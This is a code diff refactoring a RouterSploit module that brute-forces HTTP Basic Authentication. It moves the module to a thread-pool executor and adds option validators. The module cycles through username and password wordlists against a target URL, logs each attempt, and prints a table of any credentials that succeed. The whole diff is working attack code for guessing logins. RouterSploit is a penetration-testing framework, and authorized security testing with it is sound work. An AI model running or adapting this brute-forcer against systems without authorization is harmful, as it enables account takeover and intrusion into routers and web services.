@@ -6,14 +6,15 @@ from routersploit import (
     wordlists,
     print_status,
     print_error,
-    LockedIterator,
     print_success,
     print_table,
-    sanitize_url,
     http_request,
-    boolify,
     multi,
+    threads,
+    validators,
 )
+
+from routersploit.exceptions import StopThreadPoolExecutor
 
 
 class Exploit(exploits.Exploit):
@@ -36,17 +37,15 @@ class Exploit(exploits.Exploit):
         ],
     }
 
-    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
+    target = exploits.Option('', 'Target IP address or file with target:port (file://)', validators=validators.url)
     port = exploits.Option(80, 'Target port')
 
     threads = exploits.Option(8, 'Numbers of threads')
     usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
     passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
     path = exploits.Option('/', 'URL Path')
-    verbosity = exploits.Option('yes', 'Display authentication attempts')
-    stop_on_success = exploits.Option('yes', 'Stop on first valid authentication attempt')
-
-    credentials = []
+    verbosity = exploits.Option(True, 'Display authentication attempts', validators=validators.boolify)
+    stop_on_success = exploits.Option(True, 'Stop on first valid authentication attempt', validators=validators.boolify)
 
     def run(self):
         self.credentials = []
@@ -54,7 +53,7 @@ class Exploit(exploits.Exploit):
 
     @multi
     def attack(self):
-        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
+        url = "{}:{}{}".format(self.target, self.port, self.path)
 
         response = http_request(method="GET", url=url)
         if response is None:
@@ -74,41 +73,31 @@ class Exploit(exploits.Exploit):
         else:
             passwords = [self.passwords]
 
-        collection = LockedIterator(itertools.product(usernames, passwords))
+        collection = itertools.product(usernames, passwords)
 
-        self.run_threads(self.threads, self.target_function, collection)
+        with threads.ThreadPoolExecutor(self.threads) as executor:
+            for record in collection:
+                executor.submit(self.target_function, url, record)
 
-        if len(self.credentials):
+        if self.credentials:
             print_success("Credentials found!")
             headers = ("Target", "Port", "Login", "Password")
             print_table(headers, *self.credentials)
         else:
             print_error("Credentials not found")
 
-    def target_function(self, running, data):
-        module_verbosity = boolify(self.verbosity)
+    def target_function(self, url, creds):
         name = threading.current_thread().name
-        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
+        user, password = creds
+        user = user.encode('utf-8').strip()
+        password = password.encode('utf-8').strip()
 
-        print_status(name, 'process is starting...', verbose=module_verbosity)
+        response = http_request(method="GET", url=url, auth=(user, password))
 
-        while running.is_set():
-            try:
-                user, password = data.next()
-                user = user.encode('utf-8').strip()
-                password = password.encode('utf-8').strip()
-
-                response = http_request(method="GET", url=url, auth=(user, password))
-
-                if response.status_code != 401:
-                    if boolify(self.stop_on_success):
-                        running.clear()
-
-                    print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
-                    self.credentials.append((self.target, self.port, user, password))
-                else:
-                    print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
-            except StopIteration:
-                break
-
-        print_status(name, 'process is terminated.', verbose=module_verbosity)
+        if response is not None and response.status_code != 401:
+            print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=self.verbosity)
+            self.credentials.append((self.target, self.port, user, password))
+            if self.stop_on_success:
+                raise StopThreadPoolExecutor
+        else:
+            print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=self.verbosity)
